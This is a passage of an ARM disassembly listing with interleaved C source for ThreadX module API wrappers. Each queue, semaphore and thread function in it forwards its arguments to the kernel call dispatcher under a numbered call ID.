 8020daa:	46bd      	mov	sp, r7
 8020dac:	bd90      	pop	{r4, r7, pc}
 8020dae:	bf00      	nop
 8020db0:	00000004 	.word	0x00000004

08020db4 <_txe_queue_prioritize>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_queue_prioritize(TX_QUEUE *queue_ptr)
{
 8020db4:	b590      	push	{r4, r7, lr}
 8020db6:	b085      	sub	sp, #20
 8020db8:	af00      	add	r7, sp, #0
 8020dba:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_PRIORITIZE_CALL, (ALIGN_TYPE) queue_ptr, 0, 0);
 8020dbc:	4b07      	ldr	r3, [pc, #28]	; (8020ddc <_txe_queue_prioritize+0x28>)
 8020dbe:	f859 3003 	ldr.w	r3, [r9, r3]
 8020dc2:	681c      	ldr	r4, [r3, #0]
 8020dc4:	6879      	ldr	r1, [r7, #4]
 8020dc6:	2300      	movs	r3, #0
 8020dc8:	2200      	movs	r2, #0
 8020dca:	2029      	movs	r0, #41	; 0x29
 8020dcc:	47a0      	blx	r4
 8020dce:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020dd0:	68fb      	ldr	r3, [r7, #12]
}
 8020dd2:	4618      	mov	r0, r3
 8020dd4:	3714      	adds	r7, #20
 8020dd6:	46bd      	mov	sp, r7
 8020dd8:	bd90      	pop	{r4, r7, pc}
 8020dda:	bf00      	nop
 8020ddc:	00000004 	.word	0x00000004

08020de0 <_txe_queue_receive>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_queue_receive(TX_QUEUE *queue_ptr, VOID *destination_ptr, ULONG wait_option)
{
 8020de0:	b590      	push	{r4, r7, lr}
 8020de2:	b087      	sub	sp, #28
 8020de4:	af00      	add	r7, sp, #0
 8020de6:	60f8      	str	r0, [r7, #12]
 8020de8:	60b9      	str	r1, [r7, #8]
 8020dea:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_RECEIVE_CALL, (ALIGN_TYPE) queue_ptr, (ALIGN_TYPE) destination_ptr, (ALIGN_TYPE) wait_option);
 8020dec:	4b07      	ldr	r3, [pc, #28]	; (8020e0c <_txe_queue_receive+0x2c>)
 8020dee:	f859 3003 	ldr.w	r3, [r9, r3]
 8020df2:	681c      	ldr	r4, [r3, #0]
 8020df4:	68f9      	ldr	r1, [r7, #12]
 8020df6:	68ba      	ldr	r2, [r7, #8]
 8020df8:	687b      	ldr	r3, [r7, #4]
 8020dfa:	202a      	movs	r0, #42	; 0x2a
 8020dfc:	47a0      	blx	r4
 8020dfe:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 8020e00:	697b      	ldr	r3, [r7, #20]
}
 8020e02:	4618      	mov	r0, r3
 8020e04:	371c      	adds	r7, #28
 8020e06:	46bd      	mov	sp, r7
 8020e08:	bd90      	pop	{r4, r7, pc}
 8020e0a:	bf00      	nop
 8020e0c:	00000004 	.word	0x00000004

08020e10 <_txe_queue_send>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_queue_send(TX_QUEUE *queue_ptr, VOID *source_ptr, ULONG wait_option)
{
 8020e10:	b590      	push	{r4, r7, lr}
 8020e12:	b087      	sub	sp, #28
 8020e14:	af00      	add	r7, sp, #0
 8020e16:	60f8      	str	r0, [r7, #12]
 8020e18:	60b9      	str	r1, [r7, #8]
 8020e1a:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_SEND_CALL, (ALIGN_TYPE) queue_ptr, (ALIGN_TYPE) source_ptr, (ALIGN_TYPE) wait_option);
 8020e1c:	4b07      	ldr	r3, [pc, #28]	; (8020e3c <_txe_queue_send+0x2c>)
 8020e1e:	f859 3003 	ldr.w	r3, [r9, r3]
 8020e22:	681c      	ldr	r4, [r3, #0]
 8020e24:	68f9      	ldr	r1, [r7, #12]
 8020e26:	68ba      	ldr	r2, [r7, #8]
 8020e28:	687b      	ldr	r3, [r7, #4]
 8020e2a:	202b      	movs	r0, #43	; 0x2b
 8020e2c:	47a0      	blx	r4
 8020e2e:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 8020e30:	697b      	ldr	r3, [r7, #20]
}
 8020e32:	4618      	mov	r0, r3
 8020e34:	371c      	adds	r7, #28
 8020e36:	46bd      	mov	sp, r7
 8020e38:	bd90      	pop	{r4, r7, pc}
 8020e3a:	bf00      	nop
 8020e3c:	00000004 	.word	0x00000004

08020e40 <_txe_queue_send_notify>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_queue_send_notify(TX_QUEUE *queue_ptr, VOID (*queue_send_notify)(TX_QUEUE *notify_queue_ptr))
{
 8020e40:	b590      	push	{r4, r7, lr}
 8020e42:	b085      	sub	sp, #20
 8020e44:	af00      	add	r7, sp, #0
 8020e46:	6078      	str	r0, [r7, #4]
 8020e48:	6039      	str	r1, [r7, #0]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_SEND_NOTIFY_CALL, (ALIGN_TYPE) queue_ptr, (ALIGN_TYPE) queue_send_notify, 0);
 8020e4a:	4b07      	ldr	r3, [pc, #28]	; (8020e68 <_txe_queue_send_notify+0x28>)
 8020e4c:	f859 3003 	ldr.w	r3, [r9, r3]
 8020e50:	681c      	ldr	r4, [r3, #0]
 8020e52:	6879      	ldr	r1, [r7, #4]
 8020e54:	683a      	ldr	r2, [r7, #0]
 8020e56:	2300      	movs	r3, #0
 8020e58:	202c      	movs	r0, #44	; 0x2c
 8020e5a:	47a0      	blx	r4
 8020e5c:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020e5e:	68fb      	ldr	r3, [r7, #12]
}
 8020e60:	4618      	mov	r0, r3
 8020e62:	3714      	adds	r7, #20
 8020e64:	46bd      	mov	sp, r7
 8020e66:	bd90      	pop	{r4, r7, pc}
 8020e68:	00000004 	.word	0x00000004

08020e6c <_txe_semaphore_ceiling_put>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_semaphore_ceiling_put(TX_SEMAPHORE *semaphore_ptr, ULONG ceiling)
{
 8020e6c:	b590      	push	{r4, r7, lr}
 8020e6e:	b085      	sub	sp, #20
 8020e70:	af00      	add	r7, sp, #0
 8020e72:	6078      	str	r0, [r7, #4]
 8020e74:	6039      	str	r1, [r7, #0]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_SEMAPHORE_CEILING_PUT_CALL, (ALIGN_TYPE) semaphore_ptr, (ALIGN_TYPE) ceiling, 0);
 8020e76:	4b07      	ldr	r3, [pc, #28]	; (8020e94 <_txe_semaphore_ceiling_put+0x28>)
 8020e78:	f859 3003 	ldr.w	r3, [r9, r3]
 8020e7c:	681c      	ldr	r4, [r3, #0]
 8020e7e:	6879      	ldr	r1, [r7, #4]
 8020e80:	2300      	movs	r3, #0
 8020e82:	683a      	ldr	r2, [r7, #0]
 8020e84:	202d      	movs	r0, #45	; 0x2d
 8020e86:	47a0      	blx	r4
 8020e88:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020e8a:	68fb      	ldr	r3, [r7, #12]
}
 8020e8c:	4618      	mov	r0, r3
 8020e8e:	3714      	adds	r7, #20
 8020e90:	46bd      	mov	sp, r7
 8020e92:	bd90      	pop	{r4, r7, pc}
 8020e94:	00000004 	.word	0x00000004

08020e98 <_txe_semaphore_create>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_semaphore_create(TX_SEMAPHORE *semaphore_ptr, CHAR *name_ptr, ULONG initial_count, UINT semaphore_control_block_size)
{
 8020e98:	b590      	push	{r4, r7, lr}
 8020e9a:	b089      	sub	sp, #36	; 0x24
 8020e9c:	af00      	add	r7, sp, #0
 8020e9e:	60f8      	str	r0, [r7, #12]
 8020ea0:	60b9      	str	r1, [r7, #8]
 8020ea2:	607a      	str	r2, [r7, #4]
 8020ea4:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[2];

    extra_parameters[0] = (ALIGN_TYPE) initial_count;
 8020ea6:	687b      	ldr	r3, [r7, #4]
 8020ea8:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) semaphore_control_block_size;
 8020eaa:	683b      	ldr	r3, [r7, #0]
 8020eac:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_SEMAPHORE_CREATE_CALL, (ALIGN_TYPE) semaphore_ptr, (ALIGN_TYPE) name_ptr, (ALIGN_TYPE) extra_parameters);
 8020eae:	4b08      	ldr	r3, [pc, #32]	; (8020ed0 <_txe_semaphore_create+0x38>)
 8020eb0:	f859 3003 	ldr.w	r3, [r9, r3]
 8020eb4:	681c      	ldr	r4, [r3, #0]
 8020eb6:	68f9      	ldr	r1, [r7, #12]
 8020eb8:	68ba      	ldr	r2, [r7, #8]
 8020eba:	f107 0314 	add.w	r3, r7, #20
 8020ebe:	202e      	movs	r0, #46	; 0x2e
 8020ec0:	47a0      	blx	r4
 8020ec2:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 8020ec4:	69fb      	ldr	r3, [r7, #28]
}
 8020ec6:	4618      	mov	r0, r3
 8020ec8:	3724      	adds	r7, #36	; 0x24
 8020eca:	46bd      	mov	sp, r7
 8020ecc:	bd90      	pop	{r4, r7, pc}
 8020ece:	bf00      	nop
 8020ed0:	00000004 	.word	0x00000004

08020ed4 <_txe_semaphore_delete>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_semaphore_delete(TX_SEMAPHORE *semaphore_ptr)
{
 8020ed4:	b590      	push	{r4, r7, lr}
 8020ed6:	b085      	sub	sp, #20
 8020ed8:	af00      	add	r7, sp, #0
 8020eda:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_SEMAPHORE_DELETE_CALL, (ALIGN_TYPE) semaphore_ptr, 0, 0);
 8020edc:	4b07      	ldr	r3, [pc, #28]	; (8020efc <_txe_semaphore_delete+0x28>)
 8020ede:	f859 3003 	ldr.w	r3, [r9, r3]
 8020ee2:	681c      	ldr	r4, [r3, #0]
 8020ee4:	6879      	ldr	r1, [r7, #4]
 8020ee6:	2300      	movs	r3, #0
 8020ee8:	2200      	movs	r2, #0
 8020eea:	202f      	movs	r0, #47	; 0x2f
 8020eec:	47a0      	blx	r4
 8020eee:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020ef0:	68fb      	ldr	r3, [r7, #12]
}
 8020ef2:	4618      	mov	r0, r3
 8020ef4:	3714      	adds	r7, #20
 8020ef6:	46bd      	mov	sp, r7
 8020ef8:	bd90      	pop	{r4, r7, pc}
 8020efa:	bf00      	nop
 8020efc:	00000004 	.word	0x00000004

08020f00 <_txe_semaphore_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_semaphore_get(TX_SEMAPHORE *semaphore_ptr, ULONG wait_option)
{
 8020f00:	b590      	push	{r4, r7, lr}
 8020f02:	b085      	sub	sp, #20
 8020f04:	af00      	add	r7, sp, #0
 8020f06:	6078      	str	r0, [r7, #4]
 8020f08:	6039      	str	r1, [r7, #0]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_SEMAPHORE_GET_CALL, (ALIGN_TYPE) semaphore_ptr, (ALIGN_TYPE) wait_option, 0);
 8020f0a:	4b07      	ldr	r3, [pc, #28]	; (8020f28 <_txe_semaphore_get+0x28>)
 8020f0c:	f859 3003 	ldr.w	r3, [r9, r3]
 8020f10:	681c      	ldr	r4, [r3, #0]
 8020f12:	6879      	ldr	r1, [r7, #4]
 8020f14:	2300      	movs	r3, #0
 8020f16:	683a      	ldr	r2, [r7, #0]
 8020f18:	2030      	movs	r0, #48	; 0x30
 8020f1a:	47a0      	blx	r4
 8020f1c:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020f1e:	68fb      	ldr	r3, [r7, #12]
}
 8020f20:	4618      	mov	r0, r3
 8020f22:	3714      	adds	r7, #20
 8020f24:	46bd      	mov	sp, r7
 8020f26:	bd90      	pop	{r4, r7, pc}
 8020f28:	00000004 	.word	0x00000004

08020f2c <_txe_semaphore_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_semaphore_info_get(TX_SEMAPHORE *semaphore_ptr, CHAR **name, ULONG *current_value, TX_THREAD **first_suspended, ULONG *suspended_count, TX_SEMAPHORE **next_semaphore)
{
 8020f2c:	b590      	push	{r4, r7, lr}
 8020f2e:	b08b      	sub	sp, #44	; 0x2c
 8020f30:	af00      	add	r7, sp, #0
 8020f32:	60f8      	str	r0, [r7, #12]
 8020f34:	60b9      	str	r1, [r7, #8]
 8020f36:	607a      	str	r2, [r7, #4]
 8020f38:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[4];

    extra_parameters[0] = (ALIGN_TYPE) current_value;
 8020f3a:	687b      	ldr	r3, [r7, #4]
 8020f3c:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) first_suspended;
 8020f3e:	683b      	ldr	r3, [r7, #0]
 8020f40:	61bb      	str	r3, [r7, #24]
    extra_parameters[2] = (ALIGN_TYPE) suspended_count;
 8020f42:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8020f44:	61fb      	str	r3, [r7, #28]
    extra_parameters[3] = (ALIGN_TYPE) next_semaphore;
 8020f46:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8020f48:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_SEMAPHORE_INFO_GET_CALL, (ALIGN_TYPE) semaphore_ptr, (ALIGN_TYPE) name, (ALIGN_TYPE) extra_parameters);
 8020f4a:	4b08      	ldr	r3, [pc, #32]	; (8020f6c <_txe_semaphore_info_get+0x40>)
 8020f4c:	f859 3003 	ldr.w	r3, [r9, r3]
 8020f50:	681c      	ldr	r4, [r3, #0]
 8020f52:	68f9      	ldr	r1, [r7, #12]
 8020f54:	68ba      	ldr	r2, [r7, #8]
 8020f56:	f107 0314 	add.w	r3, r7, #20
 8020f5a:	2031      	movs	r0, #49	; 0x31
 8020f5c:	47a0      	blx	r4
 8020f5e:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8020f60:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 8020f62:	4618      	mov	r0, r3
 8020f64:	372c      	adds	r7, #44	; 0x2c
 8020f66:	46bd      	mov	sp, r7
 8020f68:	bd90      	pop	{r4, r7, pc}
 8020f6a:	bf00      	nop
 8020f6c:	00000004 	.word	0x00000004

08020f70 <_tx_semaphore_performance_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_semaphore_performance_info_get(TX_SEMAPHORE *semaphore_ptr, ULONG *puts, ULONG *gets, ULONG *suspensions, ULONG *timeouts)
{
 8020f70:	b590      	push	{r4, r7, lr}
 8020f72:	b089      	sub	sp, #36	; 0x24
 8020f74:	af00      	add	r7, sp, #0
 8020f76:	60f8      	str	r0, [r7, #12]
 8020f78:	60b9      	str	r1, [r7, #8]
 8020f7a:	607a      	str	r2, [r7, #4]
 8020f7c:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[3];

    extra_parameters[0] = (ALIGN_TYPE) gets;
 8020f7e:	687b      	ldr	r3, [r7, #4]
 8020f80:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) suspensions;
 8020f82:	683b      	ldr	r3, [r7, #0]
 8020f84:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) timeouts;
 8020f86:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8020f88:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_SEMAPHORE_PERFORMANCE_INFO_GET_CALL, (ALIGN_TYPE) semaphore_ptr, (ALIGN_TYPE) puts, (ALIGN_TYPE) extra_parameters);
 8020f8a:	4b08      	ldr	r3, [pc, #32]	; (8020fac <_tx_semaphore_performance_info_get+0x3c>)
 8020f8c:	f859 3003 	ldr.w	r3, [r9, r3]
 8020f90:	681c      	ldr	r4, [r3, #0]
 8020f92:	68f9      	ldr	r1, [r7, #12]
 8020f94:	68ba      	ldr	r2, [r7, #8]
 8020f96:	f107 0310 	add.w	r3, r7, #16
 8020f9a:	2032      	movs	r0, #50	; 0x32
 8020f9c:	47a0      	blx	r4
 8020f9e:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 8020fa0:	69fb      	ldr	r3, [r7, #28]
}
 8020fa2:	4618      	mov	r0, r3
 8020fa4:	3724      	adds	r7, #36	; 0x24
 8020fa6:	46bd      	mov	sp, r7
 8020fa8:	bd90      	pop	{r4, r7, pc}
 8020faa:	bf00      	nop
 8020fac:	00000004 	.word	0x00000004

08020fb0 <_tx_semaphore_performance_system_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_semaphore_performance_system_info_get(ULONG *puts, ULONG *gets, ULONG *suspensions, ULONG *timeouts)
{
 8020fb0:	b590      	push	{r4, r7, lr}
 8020fb2:	b089      	sub	sp, #36	; 0x24
 8020fb4:	af00      	add	r7, sp, #0
 8020fb6:	60f8      	str	r0, [r7, #12]
 8020fb8:	60b9      	str	r1, [r7, #8]
 8020fba:	607a      	str	r2, [r7, #4]
 8020fbc:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[2];

    extra_parameters[0] = (ALIGN_TYPE) suspensions;
 8020fbe:	687b      	ldr	r3, [r7, #4]
 8020fc0:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) timeouts;
 8020fc2:	683b      	ldr	r3, [r7, #0]
 8020fc4:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_SEMAPHORE_PERFORMANCE_SYSTEM_INFO_GET_CALL, (ALIGN_TYPE) puts, (ALIGN_TYPE) gets, (ALIGN_TYPE) extra_parameters);
 8020fc6:	4b08      	ldr	r3, [pc, #32]	; (8020fe8 <_tx_semaphore_performance_system_info_get+0x38>)
 8020fc8:	f859 3003 	ldr.w	r3, [r9, r3]
 8020fcc:	681c      	ldr	r4, [r3, #0]
 8020fce:	68f9      	ldr	r1, [r7, #12]
 8020fd0:	68ba      	ldr	r2, [r7, #8]
 8020fd2:	f107 0314 	add.w	r3, r7, #20
 8020fd6:	2033      	movs	r0, #51	; 0x33
 8020fd8:	47a0      	blx	r4
 8020fda:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 8020fdc:	69fb      	ldr	r3, [r7, #28]
}
 8020fde:	4618      	mov	r0, r3
 8020fe0:	3724      	adds	r7, #36	; 0x24
 8020fe2:	46bd      	mov	sp, r7
 8020fe4:	bd90      	pop	{r4, r7, pc}
 8020fe6:	bf00      	nop
 8020fe8:	00000004 	.word	0x00000004

08020fec <_txe_semaphore_prioritize>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_semaphore_prioritize(TX_SEMAPHORE *semaphore_ptr)
{
 8020fec:	b590      	push	{r4, r7, lr}
 8020fee:	b085      	sub	sp, #20
 8020ff0:	af00      	add	r7, sp, #0
 8020ff2:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_SEMAPHORE_PRIORITIZE_CALL, (ALIGN_TYPE) semaphore_ptr, 0, 0);
 8020ff4:	4b07      	ldr	r3, [pc, #28]	; (8021014 <_txe_semaphore_prioritize+0x28>)
 8020ff6:	f859 3003 	ldr.w	r3, [r9, r3]
 8020ffa:	681c      	ldr	r4, [r3, #0]
 8020ffc:	6879      	ldr	r1, [r7, #4]
 8020ffe:	2300      	movs	r3, #0
 8021000:	2200      	movs	r2, #0
 8021002:	2034      	movs	r0, #52	; 0x34
 8021004:	47a0      	blx	r4
 8021006:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8021008:	68fb      	ldr	r3, [r7, #12]
}
 802100a:	4618      	mov	r0, r3
 802100c:	3714      	adds	r7, #20
 802100e:	46bd      	mov	sp, r7
 8021010:	bd90      	pop	{r4, r7, pc}
 8021012:	bf00      	nop
 8021014:	00000004 	.word	0x00000004

08021018 <_txe_semaphore_put>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_semaphore_put(TX_SEMAPHORE *semaphore_ptr)
{
 8021018:	b590      	push	{r4, r7, lr}
 802101a:	b085      	sub	sp, #20
 802101c:	af00      	add	r7, sp, #0
 802101e:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_SEMAPHORE_PUT_CALL, (ALIGN_TYPE) semaphore_ptr, 0, 0);
 8021020:	4b07      	ldr	r3, [pc, #28]	; (8021040 <_txe_semaphore_put+0x28>)
 8021022:	f859 3003 	ldr.w	r3, [r9, r3]
 8021026:	681c      	ldr	r4, [r3, #0]
 8021028:	6879      	ldr	r1, [r7, #4]
 802102a:	2300      	movs	r3, #0
 802102c:	2200      	movs	r2, #0
 802102e:	2035      	movs	r0, #53	; 0x35
 8021030:	47a0      	blx	r4
 8021032:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8021034:	68fb      	ldr	r3, [r7, #12]
}
 8021036:	4618      	mov	r0, r3
 8021038:	3714      	adds	r7, #20
 802103a:	46bd      	mov	sp, r7
 802103c:	bd90      	pop	{r4, r7, pc}
 802103e:	bf00      	nop
 8021040:	00000004 	.word	0x00000004

08021044 <_txe_semaphore_put_notify>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_semaphore_put_notify(TX_SEMAPHORE *semaphore_ptr, VOID (*semaphore_put_notify)(TX_SEMAPHORE *notify_semaphore_ptr))
{
 8021044:	b590      	push	{r4, r7, lr}
 8021046:	b085      	sub	sp, #20
 8021048:	af00      	add	r7, sp, #0
 802104a:	6078      	str	r0, [r7, #4]
 802104c:	6039      	str	r1, [r7, #0]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_SEMAPHORE_PUT_NOTIFY_CALL, (ALIGN_TYPE) semaphore_ptr, (ALIGN_TYPE) semaphore_put_notify, 0);
 802104e:	4b07      	ldr	r3, [pc, #28]	; (802106c <_txe_semaphore_put_notify+0x28>)
 8021050:	f859 3003 	ldr.w	r3, [r9, r3]
 8021054:	681c      	ldr	r4, [r3, #0]
 8021056:	6879      	ldr	r1, [r7, #4]
 8021058:	683a      	ldr	r2, [r7, #0]
 802105a:	2300      	movs	r3, #0
 802105c:	2036      	movs	r0, #54	; 0x36
 802105e:	47a0      	blx	r4
 8021060:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8021062:	68fb      	ldr	r3, [r7, #12]
}
 8021064:	4618      	mov	r0, r3
 8021066:	3714      	adds	r7, #20
 8021068:	46bd      	mov	sp, r7
 802106a:	bd90      	pop	{r4, r7, pc}
 802106c:	00000004 	.word	0x00000004

08021070 <_txe_thread_create>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_create(TX_THREAD *thread_ptr, CHAR *name_ptr, VOID (*entry_function)(ULONG entry_input), ULONG entry_input, VOID *stack_start, ULONG stack_size, UINT priority, UINT preempt_threshold, ULONG time_slice, UINT auto_start, UINT thread_control_block_size)
{
 8021070:	b590      	push	{r4, r7, lr}
 8021072:	b08f      	sub	sp, #60	; 0x3c
 8021074:	af00      	add	r7, sp, #0
 8021076:	60f8      	str	r0, [r7, #12]
 8021078:	60b9      	str	r1, [r7, #8]
 802107a:	607a      	str	r2, [r7, #4]
 802107c:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[9];

    extra_parameters[0] = (ALIGN_TYPE) entry_function;
 802107e:	687b      	ldr	r3, [r7, #4]
 8021080:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) entry_input;
 8021082:	683b      	ldr	r3, [r7, #0]
 8021084:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) stack_start;
 8021086:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8021088:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) stack_size;
 802108a:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 802108c:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) priority;
 802108e:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8021090:	623b      	str	r3, [r7, #32]
    extra_parameters[5] = (ALIGN_TYPE) preempt_threshold;
 8021092:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8021094:	627b      	str	r3, [r7, #36]	; 0x24
    extra_parameters[6] = (ALIGN_TYPE) time_slice;
 8021096:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8021098:	62bb      	str	r3, [r7, #40]	; 0x28
    extra_parameters[7] = (ALIGN_TYPE) auto_start;
 802109a:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 802109c:	62fb      	str	r3, [r7, #44]	; 0x2c
    extra_parameters[8] = (ALIGN_TYPE) thread_control_block_size;
 802109e:	6e3b      	ldr	r3, [r7, #96]	; 0x60
 80210a0:	633b      	str	r3, [r7, #48]	; 0x30

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_CREATE_CALL, (ALIGN_TYPE) thread_ptr, (ALIGN_TYPE) name_ptr, (ALIGN_TYPE) extra_parameters);
 80210a2:	4b08      	ldr	r3, [pc, #32]	; (80210c4 <_txe_thread_create+0x54>)
 80210a4:	f859 3003 	ldr.w	r3, [r9, r3]
 80210a8:	681c      	ldr	r4, [r3, #0]
 80210aa:	68f9      	ldr	r1, [r7, #12]
 80210ac:	68ba      	ldr	r2, [r7, #8]
 80210ae:	f107 0310 	add.w	r3, r7, #16
 80210b2:	2037      	movs	r0, #55	; 0x37
 80210b4:	47a0      	blx	r4
 80210b6:	6378      	str	r0, [r7, #52]	; 0x34

    /* Return value to the caller.  */
    return(return_value);
 80210b8:	6b7b      	ldr	r3, [r7, #52]	; 0x34
}
 80210ba:	4618      	mov	r0, r3
 80210bc:	373c      	adds	r7, #60	; 0x3c
 80210be:	46bd      	mov	sp, r7
 80210c0:	bd90      	pop	{r4, r7, pc}
 80210c2:	bf00      	nop
 80210c4:	00000004 	.word	0x00000004

080210c8 <_txe_thread_delete>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_delete(TX_THREAD *thread_ptr)
{
 80210c8:	b590      	push	{r4, r7, lr}
 80210ca:	b085      	sub	sp, #20
 80210cc:	af00      	add	r7, sp, #0
 80210ce:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_DELETE_CALL, (ALIGN_TYPE) thread_ptr, 0, 0);
 80210d0:	4b07      	ldr	r3, [pc, #28]	; (80210f0 <_txe_thread_delete+0x28>)
 80210d2:	f859 3003 	ldr.w	r3, [r9, r3]
 80210d6:	681c      	ldr	r4, [r3, #0]
 80210d8:	6879      	ldr	r1, [r7, #4]
 80210da:	2300      	movs	r3, #0
 80210dc:	2200      	movs	r2, #0
 80210de:	2038      	movs	r0, #56	; 0x38
 80210e0:	47a0      	blx	r4
 80210e2:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 80210e4:	68fb      	ldr	r3, [r7, #12]
}
 80210e6:	4618      	mov	r0, r3
 80210e8:	3714      	adds	r7, #20
 80210ea:	46bd      	mov	sp, r7
 80210ec:	bd90      	pop	{r4, r7, pc}
 80210ee:	bf00      	nop
